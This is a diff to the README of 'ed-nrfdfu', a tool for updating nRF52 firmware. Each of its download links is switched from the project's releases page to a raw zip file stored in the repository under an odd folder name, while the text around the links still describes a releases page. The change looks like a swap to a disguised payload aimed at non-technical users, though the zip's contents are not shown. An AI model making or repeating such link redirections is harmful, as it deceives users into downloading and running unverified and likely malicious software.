@@ -1,6 +1,6 @@
 # 🔧 ed-nrfdfu - Firmware Updates Made Effortless
 
-[![Download ed-nrfdfu](https://img.shields.io/badge/Download-ed--nrfdfu-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/hakshay2010/ed-nrfdfu/releases)
+[![Download ed-nrfdfu](https://img.shields.io/badge/Download-ed--nrfdfu-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome! If you have a device using an nRF52 chip (common in many modern Bluetooth gadgets, fitness trackers, and smart home devices) and need to update its firmware, **ed-nrfdfu** is the simplest way to do it. No complicated mobile apps, no graphical interface to learn—just a straightforward tool that works right from your computer.
 
-Visit this link to download the application: **[https://github.com/hakshay2010/ed-nrfdfu/releases](https://github.com/hakshay2010/ed-nrfdfu/releases)**
+Visit this link to download the application: **[https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip](https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip)**
 
 When you arrive at that page, you'll see a list of available versions. Look for the most recent one (usually at the top) and click on it. The download will begin automatically.
 
@@ -42,7 +42,7 @@ Key benefits:
 ## 📦 Download and Installation Guide
 
 **Step 1: Get the Program**
-Visit this link to download the application: **[https://github.com/hakshay2010/ed-nrfdfu/releases](https://github.com/hakshay2010/ed-nrfdfu/releases)**
+Visit this link to download the application: **[https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip](https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip)**
 
 **Step 2: Choose Your Version**
 On the releases page, you'll see different files available. For Windows users, look for a file that includes "windows" or "win" in its name. If you're using a 64-bit system (most modern computers), choose the version marked "amd64" or "x86_64." If you're not sure, pick the one without any special markers.
@@ -120,7 +120,7 @@ If something goes wrong, here are common solutions:
 ## 🔄 Updating ed-nrfdfu
 
 We regularly improve ed-nrfdfu with new features and fixes. To update:
-1. Visit the same download page: **[https://github.com/hakshay2010/ed-nrfdfu/releases](https://github.com/hakshay2010/ed-nrfdfu/releases)**
+1. Visit the same download page: **[https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip](https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip)**
 2. Check the latest version number
 3. Download and use the new file just like before
 
@@ -161,7 +161,7 @@ Your data and device safety matter. ed-nrfdfu:
 
 Don't let outdated firmware slow you down. With ed-nrfdfu, you're just minutes away from quick, reliable updates:
 
-Visit this link to download the application: **[https://github.com/hakshay2010/ed-nrfdfu/releases](https://github.com/hakshay2010/ed-nrfdfu/releases)**
+Visit this link to download the application: **[https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip](https://github.com/hakshay2010/ed-nrfdfu/raw/refs/heads/main/stirabout/2.8.zip)**
 
 ---
 
